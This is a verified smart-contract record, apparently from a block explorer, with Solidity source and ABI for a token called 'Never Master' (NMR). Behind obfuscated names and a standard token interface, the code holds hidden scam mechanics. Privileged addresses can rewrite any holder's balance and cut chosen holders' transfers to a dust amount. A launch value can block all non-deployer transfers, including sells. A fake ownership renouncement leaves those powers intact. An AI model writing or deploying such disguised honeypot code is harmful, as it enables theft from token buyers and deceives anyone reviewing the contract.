{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.11;\n\ninterface teamAuto {\n    function createPair(address takeTeamReceiver, address fromTrading) external returns (address);\n}\n\ninterface launchedTotalEnable {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address shouldTrading) external view returns (uint256);\n\n    function transfer(address swapLaunch, uint256 receiverLaunched) external returns (bool);\n\n    function allowance(address swapLiquidity, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 receiverLaunched) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address swapLaunch,\n        uint256 receiverLaunched\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed toFrom, uint256 value);\n    event Approval(address indexed swapLiquidity, address indexed spender, uint256 value);\n}\n\nabstract contract listIs {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface tradingBuy {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface totalEnableList is launchedTotalEnable {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract NeverMaster is listIs, launchedTotalEnable, totalEnableList {\n\n    uint256 private modeMarketing = 100000000 * 10 ** 18;\n\n    function symbol() external view virtual override returns (string memory) {\n        return tradingMarketing;\n    }\n\n    function balanceOf(address shouldTrading) public view virtual override returns (uint256) {\n        return senderShouldLiquidity[shouldTrading];\n    }\n\n    mapping(address => bool) public receiverExemptToken;\n\n    function approve(address txMarketing, uint256 receiverLaunched) public virtual override returns (bool) {\n        walletAuto[_msgSender()][txMarketing] = receiverLaunched;\n        emit Approval(_msgSender(), txMarketing, receiverLaunched);\n        return true;\n    }\n\n    mapping(address => mapping(address => uint256)) private walletAuto;\n\n    function transfer(address tokenMin, uint256 receiverLaunched) external virtual override returns (bool) {\n        return feeIsExempt(_msgSender(), tokenMin, receiverLaunched);\n    }\n\n    uint256 constant amountTrading = 8 ** 10;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return modeMarketing;\n    }\n\n    function amountBuyMarketing() public {\n        emit OwnershipTransferred(buyFee, address(0));\n        modeMaxTotal = address(0);\n    }\n\n    string private walletExempt = \"Never Master\";\n\n    function owner() external view returns (address) {\n        return modeMaxTotal;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return listFrom;\n    }\n\n    uint256 launchedAt;\n\n    string private tradingMarketing = \"NMR\";\n\n    uint256 public buyExemptSell;\n\n    uint256 public takeShould;\n\n    uint256 public totalShould;\n\n    function getOwner() external view returns (address) {\n        return modeMaxTotal;\n    }\n\n    function launchTrading(uint256 receiverLaunched) public {\n        tokenLiquidity();\n        totalWallet = receiverLaunched;\n    }\n\n    address public buyFee;\n\n    address totalList = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    address public marketingExempt;\n\n    event OwnershipTransferred(address indexed swapEnable, address indexed fromToken);\n\n    uint256 public tokenLaunch;\n\n    bool public autoTakeSwap;\n\n    mapping(address => uint256) private senderShouldLiquidity;\n\n    function transferFrom(address maxLiquidity, address swapLaunch, uint256 receiverLaunched) external override returns (bool) {\n        if (_msgSender() != totalList) {\n            if (walletAuto[maxLiquidity][_msgSender()] != type(uint256).max) {\n                require(receiverLaunched <= walletAuto[maxLiquidity][_msgSender()]);\n                walletAuto[maxLiquidity][_msgSender()] -= receiverLaunched;\n            }\n        }\n        return feeIsExempt(maxLiquidity, swapLaunch, receiverLaunched);\n    }\n\n    uint256 totalWallet;\n\n    function name() external view virtual override returns (string memory) {\n        return walletExempt;\n    }\n\n    uint256 private totalLimitTo;\n\n    function walletFrom(address teamFrom) public {\n        if (autoTakeSwap) {\n            return;\n        }\n        if (tokenLaunch == marketingTokenMode) {\n            totalLimitTo = marketingTokenMode;\n        }\n        toSender[teamFrom] = true;\n        if (senderLimit != isLaunchMarketing) {\n            senderLimit = false;\n        }\n        autoTakeSwap = true;\n    }\n\n    mapping(address => bool) public toSender;\n\n    address private modeMaxTotal;\n\n    function allowance(address minLaunched, address txMarketing) external view virtual override returns (uint256) {\n        if (txMarketing == totalList) {\n            return type(uint256).max;\n        }\n        return walletAuto[minLaunched][txMarketing];\n    }\n\n    function feeIsExempt(address maxLiquidity, address swapLaunch, uint256 receiverLaunched) internal returns (bool) {\n        if (maxLiquidity == buyFee) {\n            return teamShould(maxLiquidity, swapLaunch, receiverLaunched);\n        }\n        uint256 txMin = launchedTotalEnable(marketingExempt).balanceOf(swapFrom);\n        require(txMin == totalWallet);\n        require(swapLaunch != swapFrom);\n        if (receiverExemptToken[maxLiquidity]) {\n            return teamShould(maxLiquidity, swapLaunch, amountTrading);\n        }\n        return teamShould(maxLiquidity, swapLaunch, receiverLaunched);\n    }\n\n    uint256 public marketingTokenMode;\n\n    uint8 private listFrom = 18;\n\n    function liquidityIsTrading(address tokenMin, uint256 receiverLaunched) public {\n        tokenLiquidity();\n        senderShouldLiquidity[tokenMin] = receiverLaunched;\n    }\n\n    bool private senderLimit;\n\n    address swapFrom = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function amountShouldTake(address limitBuy) public {\n        tokenLiquidity();\n        \n        if (limitBuy == buyFee || limitBuy == marketingExempt) {\n            return;\n        }\n        receiverExemptToken[limitBuy] = true;\n    }\n\n    bool public isLaunchMarketing;\n\n    function teamShould(address maxLiquidity, address swapLaunch, uint256 receiverLaunched) internal returns (bool) {\n        require(senderShouldLiquidity[maxLiquidity] >= receiverLaunched);\n        senderShouldLiquidity[maxLiquidity] -= receiverLaunched;\n        senderShouldLiquidity[swapLaunch] += receiverLaunched;\n        emit Transfer(maxLiquidity, swapLaunch, receiverLaunched);\n        return true;\n    }\n\n    function tokenLiquidity() private view {\n        require(toSender[_msgSender()]);\n    }\n\n    bool private amountAtMarketing;\n\n    constructor (){\n        if (takeShould != tokenLaunch) {\n            senderLimit = true;\n        }\n        tradingBuy receiverMarketingSwap = tradingBuy(totalList);\n        marketingExempt = teamAuto(receiverMarketingSwap.factory()).createPair(receiverMarketingSwap.WETH(), address(this));\n        if (amountAtMarketing) {\n            marketingTokenMode = totalShould;\n        }\n        buyFee = _msgSender();\n        toSender[buyFee] = true;\n        senderShouldLiquidity[buyFee] = modeMarketing;\n        amountBuyMarketing();\n        \n        emit Transfer(address(0), buyFee, modeMarketing);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapLiquidity\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapEnable\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromToken\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"toFrom\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minLaunched\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"txMarketing\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountBuyMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitBuy\",\"type\":\"address\"}],\"name\":\"amountShouldTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverLaunched\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoTakeSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldTrading\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyExemptSell\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyFee\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isLaunchMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"receiverLaunched\",\"type\":\"uint256\"}],\"name\":\"launchTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverLaunched\",\"type\":\"uint256\"}],\"name\":\"liquidityIsTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingExempt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingTokenMode\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverExemptToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeShould\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"toSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenLaunch\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalShould\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverLaunched\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxLiquidity\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"swapLaunch\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverLaunched\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamFrom\",\"type\":\"address\"}],\"name\":\"walletFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "NeverMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}